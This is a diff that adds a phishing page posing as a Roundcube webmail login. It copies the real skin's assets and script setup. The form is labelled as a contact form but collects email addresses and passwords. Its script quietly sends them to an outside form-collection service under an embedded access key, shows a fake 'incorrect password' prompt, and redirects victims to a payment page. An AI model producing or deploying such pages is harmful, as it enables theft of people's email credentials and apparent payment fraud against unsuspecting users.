@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en" class="xfont-family-noto-sans xfont-size-s xthick-font-no">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>webmail ::</title>
+    <meta name="viewport" content="" id="viewport" />
+
+    <!-- Existing styles and scripts -->
+    <link rel="shortcut icon" href="skins/larry/images/faviconb82b.ico?s=1709725274">
+    <link rel="stylesheet" type="text/css" href="skins/larry/styles.minb82b.css?s=1709725274" />
+    <link rel="stylesheet" type="text/css" href="plugins/xframework/assets/styles/larry68df.css?s=1709725267">
+    <link rel="stylesheet" type="text/css" href="plugins/xskin/assets/styles/stylescc1a.css?s=1709725264">
+    <link rel="stylesheet" type="text/css" href="plugins/xskin/assets/styles/larry_desktopcc1a.css?s=1709725264">
+    <link rel="stylesheet" type="text/css" href="skins/litecube-f/assets/desktopc05e.css?s=1709725275">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Roboto&display=block">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Noto+Sans&display=block">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Ubuntu&display=block">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Montserrat+Alternates&display=block">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Sarala&display=block">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Quattrocento&display=block">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Merienda&display=block">
+    <link rel="stylesheet" type="text/css" href="plugins/jqueryui/themes/elastic/jquery-ui.mincc1a.css?s=1709725264">
+    <script src="skins/larry/ui.minb82b.js?s=1709725274"></script>
+    <script src="program/js/jquery.min28cf.js?s=1709725273"></script>
+    <script src="program/js/common.min28cf.js?s=1709725273"></script>
+    <script src="program/js/app.minb82b.js?s=1709725274"></script>
+    <script src="program/js/jstz.minb82b.js?s=1709725274"></script>
+    <script>
+        var rcmail = new rcube_webmail();
+        rcmail.set_env({
+            "task": "login",
+            "standard_windows": false,
+            "locale": "en_US",
+            "devel_mode": null,
+            "rcversion": 10606,
+            "cookie_domain": "",
+            "cookie_path": "/",
+            "cookie_secure": true,
+            "dark_mode_support": false,
+            "skin": "litecube-f",
+            "blankpage": "skins/litecube-f/watermark.html",
+            "refresh_interval": 60,
+            "session_lifetime": 600,
+            "action": "",
+            "comm_path": "/?_task=login",
+            "compose_extwin": false,
+            "dateFormats": {
+                "php": "Y-m-d",
+                "moment": "YYYY-MM-DD",
+                "datepicker": "yy-mm-dd",
+                "flatpickr": "Y-m-d"
+            },
+            "dmFormats": {
+                "php": "m-d",
+                "moment": "MM-DD",
+                "datepicker": "mm-dd",
+                "flatpickr": "m-d"
+            },
+            "timeFormats": {
+                "php": "H:i",
+                "moment": "HH:mm",
+                "datepicker": "HH:mm",
+                "flatpickr": "H:i"
+            },
+            "xelastic": false,
+            "xphone": false,
+            "xtablet": false,
+            "xmobile": false,
+            "xdesktop": true,
+            "xdevice": "desktop",
+            "timezoneOffset": 28800,
+            "xsidebarVisible": true,
+            "xassets": [
+                "../xframework/assets/bower_components/js-cookie/src/js.cookie.js",
+                "xframework/assets/scripts/framework.min.html",
+                "xframework/assets/styles/larry.html",
+                "xskin:assets/scripts/xskin.min.js",
+                "xskin:assets/styles/styles.css",
+                "xskin:assets/scripts/larry_desktop.min.js",
+                "xskin:assets/styles/larry_desktop.css",
+                "xskin:../../skins/litecube-f/assets/desktop.css"
+            ],
+            "installed_skins": ["classic", "elastic", "larry", "litecube-f"],
+            "xskin": "litecube-f",
+            "xskin_type": "desktop",
+            "rcp_skin": true,
+            "xwatermark": "../../plugins/xskin/assets/images/watermark.png",
+            "date_format": "yy-mm-dd",
+            "date_format_localized": "YYYY-MM-DD",
+            "request_token": "zaiVz8yPDAWIiKr5cQaAr3vnyiKiVS9k"
+        });
+        rcmail.add_label({
+            "loading": "Loading...",
+            "servererror": "Server Error!",
+            "connerror": "Connection Error (Failed to reach the server)!",
+            "requesttimedout": "Request timed out",
+            "refreshing": "Refreshing...",
+            "windowopenerror": "The popup window was blocked!",
+            "uploadingmany": "Uploading files...",
+            "uploading": "Uploading file...",
+            "close": "Close",
+            "save": "Save",
+            "cancel": "Cancel",
+            "alerttitle": "Attention",
+            "confirmationtitle": "Are you sure...",
+            "delete": "Delete",
+            "continue": "Continue",
+            "ok": "OK",
+            "login": "Login",
+            "folders": "Folders",
+            "search": "Search",
+            "attachment": "Attachment",
+            "section": "Section",
+            "options": "Options",
+            "errortitle": "An error occurred!",
+            "toggleadvancedoptions": "Toggle advanced options"
+        });
+        rcmail.gui_container("loginfooter", "bottomline");
+        rcmail.gui_object('loginform', 'form');
+        rcmail.gui_object('message', 'message');
+    </script>
+    <script src="plugins/xframework/assets/bower_components/js-cookie/src/js.cookie68df.js?s=1709725267"></script>
+    <script src="plugins/xframework/assets/scripts/framework.min9b49.js?s=1709725270"></script>
+    <script src="plugins/xskin/assets/scripts/xskin.mincc1a.js?s=1709725264"></script>
+    <script src="plugins/xskin/assets/scripts/larry_desktop.mincc1a.js?s=1709725264"></script>
+    <script src="plugins/jqueryui/js/jquery-ui.mincc1a.js?s=1709725264"></script>
+
+    <!-- Add custom styles for feedback -->
+    <style>
+        .feedback {
+            display: none;
+            color: green;
+            font-weight: bold;
+            margin-top: 10px;
+            text-align: center;
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+
+<body class="xlarry xdesktop xlarry-light-ui login-page xskin skin-litecube-f xcolor-6da1d3 xicons-traditional xlist-icons-no xbutton-icons-no">
+    <h1 class="voice">Contact Us</h1>
+
+    <div id="login-form">
+        <div class="box-inner" role="main">
+
+            <form id="contact-form" action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="22dc8ec1-19a8-4d10-bd96-551ddd1f0281">
+                <!-- Removed redirect field since we're handling it manually -->
+                
+                <h3>Login With Webmail</h3>
+
+<p style="color: red">Incorrect email or password. Try again</p>
+
+
+                <table>
+                    <tbody>
+                        <tr>
+                            <td class="title"><label for="name">Email</label></td>
+                            <td class="input"><input name="email" id="name" required size="40" autocapitalize="off" autocomplete="off" type="email"></td>
+                        </tr>
+                        <tr>
+                            <td class="title"><label for="email">Password</label></td>
+                            <td class="input"><input name="pass" id="email" required size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p class="formbuttons">
+                    <button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button>
+                </p>
+            </form>
+            <!-- Feedback message container -->
+            <div id="feedback" class="feedback"></div>
+        </div>
+
+        <div class="box-bottom" role="complementary">
+            <div id="message"></div>
+            <noscript>
+                <p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+            </noscript>
+        </div>
+
+        <div id="bottomline" role="contentinfo">
+            My Webmail
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const form = this;
+            const feedback = document.getElementById('feedback');
+            
+            // Show a message to the user
+            feedback.textContent = 'Submitting... Redirecting in 3 seconds...';
+
+            // Submit the form data in the background (no waiting for response)
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form)
+            }); // No .then() or .catch() since we don’t wait for a response
+
+            // Redirect after 3 seconds
+            setTimeout(() => {
+                window.location.href = './payment.html';
+            }, 3000); // 3000 milliseconds = 3 seconds
+        });
+    </script>
+
+    <script>
+        if (!window.UI) { var UI = new rcube_mail_ui(); }
+    </script>
+
+    <a id="vendor-branding" href="https://roundcubeplus.com/" target="_blank" title="More Roundcube skins and plugins at roundcubeplus.com"><span>+</span></a>
+    <script>
+        $(function() {
+            rcmail.init();
+            var images = [
+                "skins/larry/images/ajaxloader.gif",
+                "skins/larry/images/ajaxloader_dark.gif",
+                "skins/larry/images/buttons.png",
+                "skins/larry/images/addcontact.png",
+                "skins/larry/images/filetypes.png",
+                "skins/larry/images/listicons.png",
+                "skins/larry/images/messages.png",
+                "skins/larry/images/messages_dark.png",
+                "skins/larry/images/quota.png",
+                "skins/larry/images/selector.png",
+                "skins/larry/images/splitter.png",
+                "skins/larry/images/watermark.jpg"
+            ];
+            for (var i = 0; i < images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+        });
+
+    </script>
+
+</body>
+</html>
